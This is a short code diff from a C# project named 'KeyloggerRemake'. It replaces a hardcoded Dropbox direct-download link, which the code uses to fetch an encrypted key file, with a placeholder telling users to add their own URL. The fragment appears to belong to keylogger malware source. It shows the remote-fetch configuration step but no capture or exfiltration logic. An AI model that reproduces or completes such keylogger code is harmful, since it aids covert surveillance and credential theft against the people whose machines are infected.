@@ -10,7 +10,7 @@ namespace KeyloggerRemake
     {
         public static string getEncryptedKey()
         {
-            var strEncryptedFile = "https://www.dropbox.com/s/b01jcu0hde4mw4n/EncryptedJSON.txt?dl=1";
+            var strEncryptedFile = "ADDYOURURLHERE"; //MUST BE A DIRECT-DOWNLOAD LINK!
             var strEncryptedKey = "";
 
             using (WebClient wc = new WebClient())
